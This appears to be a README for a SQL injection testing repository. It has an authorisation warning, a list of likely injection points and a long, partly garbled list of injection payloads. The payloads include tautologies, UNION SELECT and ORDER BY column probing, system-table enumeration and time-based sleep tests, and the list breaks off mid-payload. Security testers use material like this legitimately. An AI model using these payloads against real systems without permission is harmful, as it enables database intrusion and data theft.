# SQL Injection Testing Guide
**⚠️ Important Note:** Always ensure you have explicit permission to test the target systems. Unauthorized testing can be illegal and unethical. Use these techniques only in controlled environments or on platforms where you have authorization.

## Overview

SQL Injection (SQLi) is a vulnerability that allows attackers to interfere with the queries an application makes to its database. This repository contains a collection of SQL injection payloads to help you test for these vulnerabilities.


### 2. **Testing for SQL Injection**

Follow these steps to test your platform for SQL injection vulnerabilities:

#### **A. Identify Injection Points**

Usually, it's tested in search boxes, user inputs and urls. So look for the following:

1. **URL Parameters**: Look for parameters in the URL, such as `http://example.com/page?id=1`.
2. **Form Inputs**: Test fields in forms, like search bars or login forms.
3. **HTTP Headers**: Check custom headers or cookies that might be used in SQL queries.
4. **API Endpoints**: Test any API endpoints that interact with a database.

#### **B. Apply SQL Injection Payloads**

1. **Injection Tests**

   Start with simple payloads to see if input fields are vulnerable:
   ```sql
   ' OR '1'='1
sql

  Or just use the big guns. Note go and remove peaces of code as you're testing, usually I go test peaces of this code to check if something changes:
  ```sql
' '' ` `` , " "" / // \ \\ ; ' or " -- or #  ' OR '1 ' OR 1 -- - " OR "" = " " OR 1 = 1 -- - ' OR '' = ' '=' 'LIKE' '=0--+  OR 1=1 ' OR 'x'='x ' AND id IS NULL; -- '''''''''''''UNION SELECT '2 %00 /*…*/  +		addition, concatenate (or space in url) ||		(double pipe) concatenate %		wildcard attribute indicator  @variable	local variable @@variable	global variable   # Numeric AND 1 AND 0 AND true AND false 1-false 1-true 1*56 -2   1' ORDER BY 1--+ 1' ORDER BY 2--+ 1' ORDER BY 3--+  1' ORDER BY 1,2--+ 1' ORDER BY 1,2,3--+  1' GROUP BY 1,2,--+ 1' GROUP BY 1,2,3--+ ' GROUP BY columnnames having 1=1 --   -1' UNION SELECT 1,2,3--+ ' UNION SELECT sum(columnname ) from tablename --   -1 UNION SELECT 1 INTO @,@ -1 UNION SELECT 1 INTO @,@,@  1 AND (SELECT * FROM Users) = 1	  ' AND MID(VERSION(),1,1) = '5';  ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --   Finding the table name   Time-Based: ,(select * from (select(sleep(10)))a) %2c(select%20*%20from%20(select(sleep(10)))a) ';WAITFOR DELA
sql
